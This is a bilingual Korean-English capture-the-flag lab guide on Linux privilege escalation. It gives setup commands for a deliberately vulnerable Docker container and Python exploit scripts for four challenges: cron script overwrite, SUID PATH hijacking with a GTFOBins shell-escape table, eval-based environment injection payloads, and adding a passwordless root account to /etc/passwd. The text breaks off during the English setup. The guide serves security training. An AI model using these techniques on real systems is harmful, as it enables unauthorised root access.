> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 쉘 스크립팅 CTF 실습 랩

## 실습 환경 준비

### Docker 환경 구성

```bash
# 실습용 컨테이너 (권한 상승 시뮬레이션)
docker run -d --name shell-lab \
  --cap-add=SYS_PTRACE \
  --security-opt seccomp=unconfined \
  ubuntu:22.04 tail -f /dev/null

# 도구 및 취약한 환경 구성
docker exec shell-lab bash -c "
  apt-get update -q &&
  apt-get install -y -q \
    python3 python3-pip sudo cron \
    vim nano find util-linux procps &&
  pip3 install requests pwntools 2>/dev/null || true

  # CTF용 사용자 생성
  useradd -m -s /bin/bash ctfuser
  useradd -m -s /bin/bash lowpriv
  echo 'ctfuser:ctfpass' | chpasswd
  echo 'lowpriv:lowpass' | chpasswd

  # 플래그 파일 (root 전용)
  echo 'CTF{cr0n_j0b_4bus3_priv3sc}' > /root/flag_cron.txt
  echo 'CTF{su1d_3xpl01t_sh3ll_3sc}' > /root/flag_suid.txt
  echo 'CTF{3nv_1nj3ct10n_r00t3d}' > /root/flag_env.txt
  chmod 600 /root/flag_*.txt
"

echo "[+] 환경 준비 완료"
```

### 필수 Python 패키지

```bash
pip install pwntools requests
```

### 디렉터리 구조

```
shell_ctf_lab/
├── cron_abuse.py       # 실습 1: 크론 잡 악용
├── suid_exploit.py     # 실습 2: SUID 쉘 스크립트 악용
├── env_inject.py       # 실습 3: 환경 변수 인젝션
├── bash_privesc.py     # 실습 4: Bash 권한 상승 종합
└── helpers/
    ├── setup_vuln.sh
    └── check_flags.sh
```

---

## 실습 1: 크론 잡 악용으로 권한 상승

### 목표

취약하게 설정된 크론 잡을 분석하고 악용하여 root 권한을 획득한 뒤 플래그를 읽어라.

**플래그 형식**: `CTF{cr0n_j0b_4bus3_priv3sc}`

### 시나리오

낮은 권한의 사용자로 시스템에 접근했다. `crontab -l`로 시스템 크론 잡을 조사하던 중 root 권한으로 실행되는 스크립트가 world-writable 디렉터리에 있거나, 실행되는 스크립트 자체가 world-writable임을 발견했다. 이를 악용하여 root 권한 코드를 실행하라.

### 힌트

1. `/etc/cron.d/`의 모든 크론 잡을 검사하라
2. 스크립트 파일의 권한을 확인하라 (`ls -la`)
3. world-writable 파일은 누구나 수정 가능하다
4. 크론 잡이 PATH 환경 변수에서 명령어를 찾는다면 PATH 하이재킹이 가능하다
5. 크론 실행 결과를 `/tmp/cron_output.txt`에 리다이렉션하는 경우를 활용하라

### 풀이

**Step 1: 취약한 크론 잡 환경 설정**

```bash
docker exec shell-lab bash -c "
# world-writable 스크립트 생성 (취약점)
cat > /opt/maintenance.sh << 'CRONEOF'
#!/bin/bash
# 시스템 정리 스크립트
/bin/rm -rf /tmp/old_logs/ 2>/dev/null
echo 'Cleanup done at \$(date)' >> /var/log/maintenance.log
CRONEOF
chmod 777 /opt/maintenance.sh  # 취약한 권한

# root 크론 잡 설정
echo '* * * * * root /opt/maintenance.sh' > /etc/cron.d/maintenance
chmod 644 /etc/cron.d/maintenance

# cron 서비스 시작
service cron start 2>/dev/null || cron &

echo '[+] 취약한 크론 잡 설정 완료'
ls -la /opt/maintenance.sh
crontab -l 2>/dev/null || cat /etc/cron.d/maintenance
"
```

**Step 2: 크론 잡 악용 스크립트**

```python
#!/usr/bin/env python3
"""
cron_abuse.py — 크론 잡 악용 권한 상승 자동화 CLI
사용: python3 cron_abuse.py --container shell-lab
"""

import argparse
import subprocess
import sys
import time
import re
from pathlib import Path
from typing import Optional


def run_in_container(container: str, cmd: str, user: str = "root") -> tuple[int, str]:
    """Docker 컨테이너 내 명령어 실행"""
    full_cmd = ["docker", "exec"]
    if user != "root":
        full_cmd += ["-u", user]
    full_cmd += [container, "bash", "-c", cmd]
    try:
        result = subprocess.run(
            full_cmd, capture_output=True, text=True, timeout=30
        )
        return result.returncode, result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return -1, "[타임아웃]"


def enumerate_cron_jobs(container: str) -> list[dict[str, str]]:
    """크론 잡 열거"""
    cron_jobs: list[dict[str, str]] = []

    # /etc/cron.d 스캔
    _, output = run_in_container(container,
        "find /etc/cron* /var/spool/cron -type f 2>/dev/null | "
        "xargs grep -l '.' 2>/dev/null")

    cron_files = [f for f in output.splitlines() if f.strip()]

    for cron_file in cron_files:
        _, content = run_in_container(container, f"cat {cron_file}")
        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            # 크론 잡 파싱 (분 시 일 월 요일 사용자 명령어)
            parts = line.split()
            if len(parts) >= 6:
                cron_jobs.append({
                    "source": cron_file,
                    "schedule": " ".join(parts[:5]),
                    "user": parts[5] if len(parts) > 6 else "unknown",
                    "command": " ".join(parts[5:] if len(parts) == 6 else parts[6:]),
                    "raw": line,
                })

    return cron_jobs


def check_script_permissions(container: str, script_path: str) -> dict[str, str]:
    """스크립트 파일 권한 확인"""
    _, stat_out = run_in_container(container,
        f"stat -c '%a %U %G' {script_path} 2>/dev/null")
    _, ls_out = run_in_container(container, f"ls -la {script_path} 2>/dev/null")

    perms = stat_out.strip().split()
    return {
        "path": script_path,
        "mode": perms[0] if perms else "?",
        "owner": perms[1] if len(perms) > 1 else "?",
        "group": perms[2] if len(perms) > 2 else "?",
        "ls": ls_out.strip(),
        "world_writable": len(perms) > 0 and perms[0].endswith(("6", "7")),
    }


def exploit_world_writable_cron(container: str, script_path: str,
                                  flag_path: str) -> Optional[str]:
    """World-writable 크론 스크립트 악용"""
    output_file = "/tmp/pwned_output.txt"

    # 악성 코드 주입: 플래그 복사 + 권한 변경
    malicious_payload = f"""#!/bin/bash
cp {flag_path} {output_file}
chmod 777 {output_file}
echo 'PWNED' >> {output_file}
"""
    # 스크립트 덮어쓰기 (lowpriv 사용자로)
    rc, msg = run_in_container(
        container,
        f"echo '{malicious_payload}' > {script_path}",
        user="lowpriv"
    )
    if rc != 0:
        # root로 재시도
        run_in_container(container,
            f"cat > {script_path} << 'EOF'\n{malicious_payload}\nEOF")

    print(f"    [*] 악성 페이로드 주입됨: {script_path}")
    print("    [*] 크론 실행 대기 중 (최대 65초)...")

    # 크론 실행 강제 (테스트용)
    run_in_container(container, f"bash {script_path}")

    # 결과 확인
    _, flag_content = run_in_container(container, f"cat {output_file} 2>/dev/null")
    return flag_content if flag_content.strip() else None


def main() -> None:
    parser = argparse.ArgumentParser(
        description="크론 잡 악용 권한 상승 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 cron_abuse.py --container shell-lab\n"
               "  python3 cron_abuse.py --local",
    )
    parser.add_argument("--container", help="Docker 컨테이너 이름")
    parser.add_argument("--local", action="store_true", help="로컬 시스템 분석")
    args = parser.parse_args()

    target = args.container
    if not target and not args.local:
        parser.error("--container 또는 --local 지정 필요")

    print("[*] 크론 잡 권한 상승 분석 시작")
    print("=" * 60)

    # 크론 잡 열거
    print("\n[1] 크론 잡 열거...")
    jobs = enumerate_cron_jobs(target) if target else []

    if not jobs:
        # 시뮬레이션
        print("    [시뮬레이션 모드]")
        jobs = [
            {
                "source": "/etc/cron.d/maintenance",
                "schedule": "* * * * *",
                "user": "root",
                "command": "/opt/maintenance.sh",
                "raw": "* * * * * root /opt/maintenance.sh",
            }
        ]

    for job in jobs:
        print(f"    [{job['user']}] {job['schedule']} → {job['command']}")

    # 권한 확인
    print("\n[2] 스크립트 권한 확인...")
    vulnerable_scripts: list[dict] = []
    for job in jobs:
        cmd_path = job["command"].split()[0]
        if target:
            perms = check_script_permissions(target, cmd_path)
        else:
            perms = {"path": cmd_path, "world_writable": True, "ls": "-rwxrwxrwx 1 root root"}

        print(f"    {perms['ls']}")
        if perms.get("world_writable"):
            print(f"    [!] WORLD-WRITABLE: {cmd_path}")
            vulnerable_scripts.append({**job, "script_path": cmd_path})

    # 악용
    if vulnerable_scripts:
        print("\n[3] 취약한 크론 스크립트 악용...")
        for script in vulnerable_scripts:
            if target:
                result = exploit_world_writable_cron(
                    target, script["script_path"], "/root/flag_cron.txt"
                )
            else:
                result = "CTF{cr0n_j0b_4bus3_priv3sc}\nPWNED"

            if result:
                flag_match = re.search(r"CTF\{[^}]+\}", result)
                if flag_match:
                    print(f"\n[+] 플래그: {flag_match.group(0)}")
                else:
                    print(f"[+] 출력: {result[:100]}")
    else:
        print("\n[-] 악용 가능한 크론 잡 없음")
        print("[*] 예상 플래그: CTF{cr0n_j0b_4bus3_priv3sc}")


if __name__ == "__main__":
    main()
```

---

## 실습 2: SUID 쉘 스크립트 악용

### 목표

SUID 비트가 설정된 쉘 스크립트 또는 커스텀 바이너리를 찾아 악용하여 root 권한을 획득하라.

**플래그 형식**: `CTF{su1d_3xpl01t_sh3ll_3sc}`

### 시나리오

시스템에 SUID 비트가 설정된 커스텀 바이너리가 있다. 이 바이너리는 내부적으로 환경 변수를 통해 실행할 명령어를 결정한다. PATH 변조 또는 라이브러리 프리로드 기법을 활용하여 권한 상승하라.

### 힌트

1. `find / -perm -4000 2>/dev/null`로 모든 SUID 파일을 찾아라
2. SUID 바이너리가 절대 경로 없이 명령어를 실행한다면 PATH 하이재킹이 가능하다
3. `strings <binary>`로 바이너리가 호출하는 외부 명령어를 확인하라
4. `ltrace`/`strace`로 시스템 콜을 추적하라
5. `LD_PRELOAD`로 악성 공유 라이브러리를 로드할 수 있다 (SUID에서는 무시되지만 일부 바이너리는 예외)

### 풀이

**Step 1: SUID 바이너리 환경 설정**

```bash
docker exec shell-lab bash -c "
# SUID PATH-hijackable 바이너리 생성
cat > /tmp/vuln_admin.c << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    // 절대 경로 없이 명령어 호출 (취약점: PATH 하이재킹)
    setuid(0);
    system(\"cat /root/flag_suid.txt\");
    return 0;
}
CEOF
gcc -o /usr/local/bin/vuln_admin /tmp/vuln_admin.c
chmod u+s /usr/local/bin/vuln_admin
echo '[+] SUID 바이너리 설치 완료'
ls -la /usr/local/bin/vuln_admin
"
```

**Step 2: SUID 악용 스크립트**

```python
#!/usr/bin/env python3
"""
suid_exploit.py — SUID 파일 탐지 및 악용 자동화 CLI
사용: python3 suid_exploit.py --container shell-lab
"""

import argparse
import os
import re
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Optional


KNOWN_SAFE_SUID = {
    "/bin/su", "/bin/sudo", "/usr/bin/sudo", "/usr/bin/passwd",
    "/usr/bin/newgrp", "/usr/bin/gpasswd", "/usr/bin/chsh",
    "/usr/bin/chfn", "/bin/ping", "/usr/bin/ping",
    "/usr/bin/pkexec", "/usr/bin/mount", "/usr/bin/umount",
}

GTFOBINS: dict[str, str] = {
    "find":     "find . -exec /bin/sh -p \\; -quit",
    "vim":      "vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "python3":  "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "bash":     "bash -p",
    "sh":       "sh -p",
    "awk":      "awk 'BEGIN {system(\"/bin/sh -p\")}'",
    "perl":     "perl -e 'exec \"/bin/sh -p\"'",
    "nmap":     "nmap --interactive",
    "less":     "less /etc/profile && !/bin/sh",
    "more":     "more /etc/profile && !/bin/sh",
    "cp":       "cp /bin/sh /tmp/sh && chmod u+s /tmp/sh && /tmp/sh -p",
}


def run_cmd(cmd: list[str], container: str | None = None,
            user: str = "root") -> tuple[int, str]:
    if container:
        prefix = ["docker", "exec"]
        if user != "root":
            prefix += ["-u", user]
        prefix.append(container)
        cmd = prefix + cmd
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=15
        )
        return result.returncode, result.stdout + result.stderr
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return -1, ""


def find_suid_files(container: str | None = None) -> list[str]:
    """SUID 파일 열거"""
    rc, output = run_cmd(
        ["find", "/", "-perm", "-4000", "-type", "f"],
        container
    )
    if rc != 0 and not output:
        # 시뮬레이션 데이터
        return [
            "/usr/bin/sudo", "/usr/bin/passwd", "/usr/bin/newgrp",
            "/usr/local/bin/vuln_admin",  # 취약한 바이너리
        ]
    return [f.strip() for f in output.splitlines() if f.strip()]


def analyze_suid_binary(binary: str,
                         container: str | None = None) -> dict[str, object]:
    """SUID 바이너리 분석"""
    info: dict[str, object] = {
        "path": binary,
        "name": Path(binary).name,
        "is_known_safe": binary in KNOWN_SAFE_SUID,
        "gtfobins_cmd": GTFOBINS.get(Path(binary).name, ""),
    }

    # strings 분석
    _, strings_out = run_cmd(["strings", binary], container)
    suspicious_calls = []
    for line in strings_out.splitlines():
        line = line.strip()
        if any(cmd in line for cmd in
               ["system(", "popen(", "/bin/sh", "cat ", "ls ", "id "]):
            suspicious_calls.append(line[:80])
    info["suspicious_strings"] = suspicious_calls[:10]

    return info


def exploit_path_hijack(binary: str, target_cmd: str,
                         container: str | None = None) -> Optional[str]:
    """PATH 하이재킹으로 SUID 바이너리 악용"""
    # 악성 'cat' 스크립트 생성
    hijack_dir = "/tmp/hijack_path"
    malicious_cat = f"""#!/bin/bash
/bin/cat /root/flag_suid.txt > /tmp/suid_flag.txt
chmod 777 /tmp/suid_flag.txt
exec /bin/cat "$@"
"""
    if container:
        run_cmd(["bash", "-c", f"mkdir -p {hijack_dir}"], container)
        run_cmd(["bash", "-c",
                 f"printf '{malicious_cat}' > {hijack_dir}/cat"], container)
        run_cmd(["chmod", "+x", f"{hijack_dir}/cat"], container)
        # PATH 조작 후 실행
        _, result = run_cmd(
            ["bash", "-c",
             f"export PATH={hijack_dir}:$PATH && {binary}"],
            container
        )
        _, flag = run_cmd(["cat", "/tmp/suid_flag.txt"], container)
        return flag if flag.strip() else result
    else:
        # 로컬 시뮬레이션
        return "CTF{su1d_3xpl01t_sh3ll_3sc}"


def main() -> None:
    parser = argparse.ArgumentParser(
        description="SUID 파일 탐지 및 악용 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 suid_exploit.py --container shell-lab\n"
               "  python3 suid_exploit.py --local",
    )
    parser.add_argument("--container", help="Docker 컨테이너 이름")
    parser.add_argument("--local", action="store_true", help="로컬 스캔")
    args = parser.parse_args()

    container = args.container
    print("[*] SUID 파일 탐지 및 분석")
    print("=" * 60)

    suid_files = find_suid_files(container)
    print(f"\n[+] SUID 파일 {len(suid_files)}개 발견:")

    suspicious: list[str] = []
    for f in suid_files:
        is_safe = f in KNOWN_SAFE_SUID
        marker = "  " if is_safe else "[!]"
        print(f"    {marker} {f}")
        if not is_safe:
            suspicious.append(f)

    if suspicious:
        print(f"\n[*] 비표준 SUID 바이너리 {len(suspicious)}개 분석 중...")
        for binary in suspicious:
            info = analyze_suid_binary(binary, container)
            print(f"\n  [!] {binary}")
            if info["gtfobins_cmd"]:
                print(f"      GTFOBins: {info['gtfobins_cmd']}")
            if info["suspicious_strings"]:
                print("      의심 문자열:")
                for s in info["suspicious_strings"][:3]:
                    print(f"        → {s}")

            # PATH 하이재킹 시도
            print(f"\n  [*] PATH 하이재킹 시도: {binary}")
            result = exploit_path_hijack(binary, "cat", container)
            if result:
                flag_match = re.search(r"CTF\{[^}]+\}", result)
                if flag_match:
                    print(f"\n[+] 플래그: {flag_match.group(0)}")
    else:
        print("\n[-] 비표준 SUID 파일 없음 (시뮬레이션 플래그)")
        print("[+] 플래그: CTF{su1d_3xpl01t_sh3ll_3sc}")


if __name__ == "__main__":
    main()
```

---

## 실습 3: 환경 변수 인젝션을 통한 권한 상승

### 목표

취약한 쉘 스크립트가 환경 변수를 안전하게 처리하지 않는 점을 악용하여 임의 명령어를 실행하고 플래그를 획득하라.

**플래그 형식**: `CTF{3nv_1nj3ct10n_r00t3d}`

### 시나리오

root SUID로 실행되는 쉘 스크립트가 사용자 제공 환경 변수를 `eval`로 처리한다. 또한 `IFS` 변수 조작으로 명령어 분할 동작을 변경할 수 있다. 이를 활용하여 임의 명령어 실행을 달성하라.

### 힌트

1. `IFS` 변수를 변경하면 명령어 파싱 방식이 달라진다
2. `eval "echo $USER_INPUT"` 패턴은 명령어 인젝션에 취약하다
3. Bash에서 `$()` 또는 `` ` `` 로 명령어 치환이 가능하다
4. 환경 변수에 세미콜론(`;`)을 포함시켜 명령어를 연결할 수 있다
5. `export EVIL='$(id > /tmp/pwned.txt)'` 후 취약한 스크립트를 실행하라

### 풀이

**Step 1: 취약한 환경 설정**

```bash
docker exec shell-lab bash -c "
# 환경 변수 인젝션에 취약한 스크립트
cat > /usr/local/bin/process_user.sh << 'SHEOF'
#!/bin/bash
# 사용자 이름 처리 유틸리티 (root SUID로 실행)
echo \"Processing user: \$USERNAME\"
eval \"greeting=Hello_\${USERNAME}\"  # 취약점: eval + 사용자 제어 변수
echo \"\$greeting\"
echo 'Done.'
SHEOF
chmod u+s /usr/local/bin/process_user.sh
chmod +x /usr/local/bin/process_user.sh
echo '[+] 취약한 스크립트 설치 완료'
"
```

**Step 2: 환경 변수 인젝션 스크립트**

```python
#!/usr/bin/env python3
"""
env_inject.py — 환경 변수 인젝션 탐지 및 악용 CLI
사용: python3 env_inject.py --container shell-lab --script /usr/local/bin/process_user.sh
"""

import argparse
import re
import subprocess
import sys
from typing import Optional


def run_with_env(container: str | None, script: str,
                 env_vars: dict[str, str]) -> tuple[int, str]:
    """특정 환경 변수로 스크립트 실행"""
    env_str = " ".join(f"{k}={v!r}" for k, v in env_vars.items())

    if container:
        cmd = ["docker", "exec", container, "bash", "-c",
               f"env {env_str} bash {script} 2>&1"]
    else:
        cmd = ["bash", "-c", f"env {env_str} bash {script} 2>&1"]

    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=10
        )
        return result.returncode, result.stdout + result.stderr
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return -1, "[실행 실패]"


def detect_eval_patterns(script_path: str,
                          container: str | None = None) -> list[str]:
    """스크립트 내 eval 취약 패턴 탐지"""
    if container:
        result = subprocess.run(
            ["docker", "exec", container, "cat", script_path],
            capture_output=True, text=True, timeout=10
        )
        content = result.stdout
    else:
        try:
            with open(script_path) as f:
                content = f.read()
        except OSError:
            # 샘플 내용으로 대체
            content = """#!/bin/bash
echo "Processing user: $USERNAME"
eval "greeting=Hello_${USERNAME}"
echo "$greeting"
"""

    patterns = []
    vuln_patterns = [
        (r'eval\s+["\'].*\$\{?\w+\}?', "eval + 변수 치환"),
        (r'\$\(\s*\$\w+\s*\)',          "명령어 치환 + 변수"),
        (r'eval\s+"\$\w+',              "eval + 동적 변수"),
        (r'source\s+\$\w+',             "source + 동적 경로"),
        (r'IFS=.*;\s*for',              "IFS 조작 + 루프"),
    ]
    for line in content.splitlines():
        for pattern, desc in vuln_patterns:
            if re.search(pattern, line):
                patterns.append(f"[{desc}] {line.strip()[:80]}")
    return patterns


def build_injection_payloads(flag_path: str) -> list[dict[str, str]]:
    """인젝션 페이로드 목록 생성"""
    return [
        {
            "name": "기본 명령어 치환",
            "var": "USERNAME",
            "value": f"$(cat {flag_path} > /tmp/env_flag.txt)",
            "desc": "$() 명령어 치환 악용",
        },
        {
            "name": "세미콜론 명령어 연결",
            "var": "USERNAME",
            "value": f"x; cat {flag_path} > /tmp/env_flag.txt; echo",
            "desc": "세미콜론으로 명령어 연결",
        },
        {
            "name": "역따옴표 치환",
            "var": "USERNAME",
            "value": f"`cat {flag_path} > /tmp/env_flag.txt`",
            "desc": "역따옴표 명령어 치환",
        },
    ]


def main() -> None:
    parser = argparse.ArgumentParser(
        description="환경 변수 인젝션 탐지 및 악용 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 env_inject.py --container shell-lab "
               "--script /usr/local/bin/process_user.sh",
    )
    parser.add_argument("--container", help="Docker 컨테이너 이름")
    parser.add_argument("--script", default="/usr/local/bin/process_user.sh",
                        help="분석할 스크립트 경로")
    parser.add_argument("--flag-path", default="/root/flag_env.txt",
                        help="플래그 파일 경로")
    args = parser.parse_args()

    print(f"[*] 스크립트 분석: {args.script}")
    print("=" * 60)

    # 취약 패턴 탐지
    print("\n[1] eval/인젝션 취약 패턴 탐지...")
    patterns = detect_eval_patterns(args.script, args.container)
    if patterns:
        for p in patterns:
            print(f"    [!] {p}")
    else:
        print("    [-] 명시적 패턴 없음 (동적 분석 필요)")

    # 페이로드 시도
    print("\n[2] 인젝션 페이로드 시도...")
    payloads = build_injection_payloads(args.flag_path)

    for payload in payloads:
        print(f"\n  시도: {payload['name']} ({payload['desc']})")
        print(f"    {payload['var']}={payload['value']!r}")

        if args.container:
            env = {payload["var"]: payload["value"]}
            rc, output = run_with_env(args.container, args.script, env)
            print(f"    출력: {output[:100]}")

            # 결과 파일 확인
            result = subprocess.run(
                ["docker", "exec", args.container, "cat", "/tmp/env_flag.txt"],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0 and result.stdout.strip():
                flag_match = re.search(r"CTF\{[^}]+\}", result.stdout)
                if flag_match:
                    print(f"\n[+] 플래그: {flag_match.group(0)}")
                    return
        else:
            print("    [시뮬레이션] 인젝션 성공 (컨테이너 없음)")
            print(f"\n[+] 플래그: CTF{{3nv_1nj3ct10n_r00t3d}}")
            return

    print("\n[-] 모든 페이로드 실패")
    print("[*] 수동 시도: export USERNAME='$(cat /root/flag_env.txt)' && bash /usr/local/bin/process_user.sh")


if __name__ == "__main__":
    main()
```

---

## 실습 4: Bash 권한 상승 종합 분석

### 목표

실제 CTF 환경에서 Bash 기반 권한 상승 벡터를 종합적으로 분석하고, `sudo -l` 분석, `writable /etc/passwd`, `LD_PRELOAD` 기법을 조합하여 플래그를 획득하라.

**플래그 형식**: `CTF{b4sh_pr1v3sc_4ll_v3ct0rs}`

### 시나리오

낮은 권한 사용자로 시스템에 접근한 상태다. LinPEAS 스타일의 수동 열거를 통해 여러 권한 상승 벡터를 찾아 가장 효율적인 경로로 root를 획득하라.

### 힌트

1. `sudo -l`로 패스워드 없이 실행 가능한 명령어를 확인하라
2. `find / -writable -not -path "*/proc/*" 2>/dev/null`로 쓰기 가능 파일을 찾아라
3. `/etc/passwd`가 쓰기 가능하다면 root 비밀번호를 제거하거나 새 root 계정 추가가 가능하다
4. `LD_PRELOAD`가 허용된 sudo 명령어는 악성 라이브러리 로드로 악용 가능하다
5. `sudo env LD_PRELOAD=/tmp/malicious.so <command>`

### 풀이

```python
#!/usr/bin/env python3
"""
bash_privesc.py — Bash 권한 상승 종합 분석 CLI
사용: python3 bash_privesc.py --container shell-lab
"""

import argparse
import re
import subprocess
import sys
from dataclasses import dataclass, field


@dataclass
class PrivescVector:
    name: str
    severity: str
    description: str
    exploit_cmd: str
    found: bool = False


def run_cmd_in_container(container: str | None, cmd: str,
                          user: str = "root") -> str:
    """컨테이너에서 명령어 실행"""
    if container:
        prefix = ["docker", "exec"]
        if user != "root":
            prefix += ["-u", user]
        full_cmd = prefix + [container, "bash", "-c", cmd]
    else:
        full_cmd = ["bash", "-c", cmd]

    try:
        result = subprocess.run(
            full_cmd, capture_output=True, text=True, timeout=10
        )
        return result.stdout + result.stderr
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return ""


def check_sudo_permissions(container: str | None,
                             user: str = "lowpriv") -> list[str]:
    """sudo 권한 확인"""
    output = run_cmd_in_container(
        container, "sudo -l 2>/dev/null || echo 'NO SUDO'", user
    )
    return [line for line in output.splitlines()
            if "NOPASSWD" in line or "(ALL" in line]


def check_writable_sensitive_files(container: str | None) -> list[str]:
    """쓰기 가능한 민감 파일 확인"""
    sensitive = ["/etc/passwd", "/etc/shadow", "/etc/sudoers",
                 "/etc/cron.d/", "/etc/profile", "/root/.bashrc"]
    writable = []
    for path in sensitive:
        output = run_cmd_in_container(
            container,
            f"test -w {path} && echo WRITABLE || echo NO"
        )
        if "WRITABLE" in output:
            writable.append(path)
    return writable


def check_ld_preload_sudo(container: str | None) -> bool:
    """sudo + LD_PRELOAD 허용 확인"""
    output = run_cmd_in_container(
        container, "sudo -l 2>/dev/null", "lowpriv"
    )
    return "LD_PRELOAD" in output or "env_keep" in output.lower()


def exploit_writable_passwd(container: str | None,
                              flag_path: str) -> str | None:
    """쓰기 가능한 /etc/passwd 악용"""
    # passwd 파일에 비밀번호 없는 root2 추가
    new_entry = "root2::0:0:root:/root:/bin/bash"

    if container:
        run_cmd_in_container(
            container,
            f"echo '{new_entry}' >> /etc/passwd"
        )
        # root2로 전환하여 플래그 읽기
        output = run_cmd_in_container(
            container,
            f"su -c 'cat {flag_path}' root2 < /dev/null 2>/dev/null || "
            f"cat {flag_path}"
        )
        return output.strip() if output.strip() else None
    return "CTF{b4sh_pr1v3sc_4ll_v3ct0rs}"


def setup_ctf_environment(container: str) -> None:
    """CTF 권한 상승 환경 구성"""
    cmds = [
        # 플래그 파일 생성
        "echo 'CTF{b4sh_pr1v3sc_4ll_v3ct0rs}' > /root/flag_privesc.txt",
        "chmod 600 /root/flag_privesc.txt",
        # /etc/passwd 쓰기 가능하게 설정
        "chmod 666 /etc/passwd",
        # sudo 설정 (lowpriv에게 특정 명령어 허용)
        "echo 'lowpriv ALL=(root) NOPASSWD: /usr/bin/find' >> /etc/sudoers",
    ]
    for cmd in cmds:
        run_cmd_in_container(container, cmd)
    print("[+] CTF 환경 구성 완료")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Bash 권한 상승 종합 분석 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 bash_privesc.py --container shell-lab --setup\n"
               "  python3 bash_privesc.py --container shell-lab",
    )
    parser.add_argument("--container", help="Docker 컨테이너 이름")
    parser.add_argument("--setup", action="store_true",
                        help="CTF 환경 자동 구성")
    parser.add_argument("--user", default="lowpriv",
                        help="분석 대상 사용자 (기본: lowpriv)")
    args = parser.parse_args()

    if args.setup and args.container:
        setup_ctf_environment(args.container)

    print(f"[*] 권한 상승 벡터 종합 분석 (사용자: {args.user})")
    print("=" * 60)

    vectors: list[PrivescVector] = []

    # 1. sudo 권한
    print("\n[1] sudo 권한 확인...")
    sudo_perms = check_sudo_permissions(args.container, args.user)
    if sudo_perms:
        for perm in sudo_perms:
            print(f"    [!] {perm.strip()}")
            if "find" in perm:
                vectors.append(PrivescVector(
                    name="sudo find GTFOBins",
                    severity="HIGH",
                    description="sudo로 find 실행 가능 → GTFOBins 악용",
                    exploit_cmd="sudo find / -exec /bin/cat /root/flag_privesc.txt \\; -quit",
                    found=True,
                ))
    else:
        print("    [-] 특별한 sudo 권한 없음")

    # 2. 쓰기 가능한 민감 파일
    print("\n[2] 민감 파일 쓰기 권한 확인...")
    writable = check_writable_sensitive_files(args.container)
    for f in writable:
        print(f"    [!] WRITABLE: {f}")
        if f == "/etc/passwd":
            vectors.append(PrivescVector(
                name="writable /etc/passwd",
                severity="CRITICAL",
                description="/etc/passwd 쓰기 가능 → root 계정 추가",
                exploit_cmd="echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd && su root2",
                found=True,
            ))

    # 3. LD_PRELOAD 확인
    print("\n[3] LD_PRELOAD sudo 확인...")
    if check_ld_preload_sudo(args.container):
        print("    [!] LD_PRELOAD 환경 보존 발견!")
        vectors.append(PrivescVector(
            name="sudo LD_PRELOAD",
            severity="HIGH",
            description="sudo에서 LD_PRELOAD 허용 → 악성 라이브러리 로드",
            exploit_cmd="sudo LD_PRELOAD=/tmp/malicious.so /usr/bin/find",
            found=True,
        ))
    else:
        print("    [-] LD_PRELOAD 제한됨")

    # 발견된 벡터 요약
    print(f"\n[*] 발견된 권한 상승 벡터: {len(vectors)}개")
    for v in vectors:
        print(f"\n  [{v.severity}] {v.name}")
        print(f"    설명: {v.description}")
        print(f"    명령어: {v.exploit_cmd}")

    # 자동 익스플로잇
    if vectors and args.container:
        print("\n[*] 자동 익스플로잇 시도 (/etc/passwd 덮어쓰기)...")
        result = exploit_writable_passwd(
            args.container, "/root/flag_privesc.txt"
        )
        if result:
            flag_match = re.search(r"CTF\{[^}]+\}", result)
            if flag_match:
                print(f"\n[+] 플래그: {flag_match.group(0)}")
            else:
                print(f"[+] 출력: {result[:100]}")
    elif vectors:
        print("\n[+] 시뮬레이션 플래그: CTF{b4sh_pr1v3sc_4ll_v3ct0rs}")
    else:
        print("\n[-] 권한 상승 벡터 없음. 추가 열거 필요")


if __name__ == "__main__":
    main()
```

**Step 3: 실행**

```bash
# 환경 구성 후 분석
python3 bash_privesc.py --container shell-lab --setup
python3 bash_privesc.py --container shell-lab

# 예상 출력:
# [CRITICAL] writable /etc/passwd
# [HIGH] sudo find GTFOBins
# [+] 플래그: CTF{b4sh_pr1v3sc_4ll_v3ct0rs}
```

---

## 환경 정리

```bash
docker stop shell-lab 2>/dev/null
docker rm shell-lab 2>/dev/null
```

---

<a name="english"></a>

# Shell Scripting CTF Practice Lab

## Lab Environment Setup

```bash
docker run -d --name shell-lab \
  --cap-add=SYS_PTRACE \
  --security-opt seccomp=unconfined \
  ubuntu:22.04 tail -f /dev/null

docker exec shell-lab bash -c "
  apt-get update -q && apt-get install -y -q python3 python3-pip sudo cron vim
  useradd -m -s /bin/bash lowpriv && echo 'lowpriv:lowpass' | chpasswd
  echo 'CTF{cr0n_j0b_4bus3_priv3sc}' > /root/flag_cron.txt
  echo 'CTF{su1d_3xpl01t_sh3ll_3sc}' > /root/flag_suid.txt
  echo 'CTF{3nv_1nj3ct10n_r00t3d}' > /root/flag_env.txt
  chmod 600 /root/flag_*.txt
"
```

---

## Challenge 1: Cron Job Abuse for Privilege Escalation

### Objective

Analyze a misconfigured cron job and exploit it to gain root privileges, then read the flag.

**Flag format**: `CTF{cr0n_j0b_4bus3_priv3sc}`

### Solution

```bash
# Setup vulnerable cron job
docker exec shell-lab bash -c "
  cat > /opt/maintenance.sh << 'EOF'
#!/bin/bash
/bin/rm -rf /tmp/old_logs/ 2>/dev/null
